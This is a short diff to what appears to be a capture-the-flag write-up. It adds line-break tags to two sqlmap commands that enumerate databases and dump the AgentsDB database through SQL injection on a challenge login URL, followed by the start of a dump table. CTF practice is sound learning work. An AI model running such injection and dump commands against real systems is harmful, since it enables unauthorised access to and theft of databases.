@@ -1,5 +1,5 @@
-sqlmap -u "https://agents.2020.chall.actf.co/login?" --level=3 --dbs
-sqlmap -u "https://agents.2020.chall.actf.co/login?" --level=3 -D AgentsDB --dump
+sqlmap -u "https://agents.2020.chall.actf.co/login?" --level=3 --dbs <br />
+sqlmap -u "https://agents.2020.chall.actf.co/login?" --level=3 -D AgentsDB --dump <br />
 
 +----------------------------------------------------------------------------------------------+--------------------------------+
 | UA                                                                                           | Name                           |
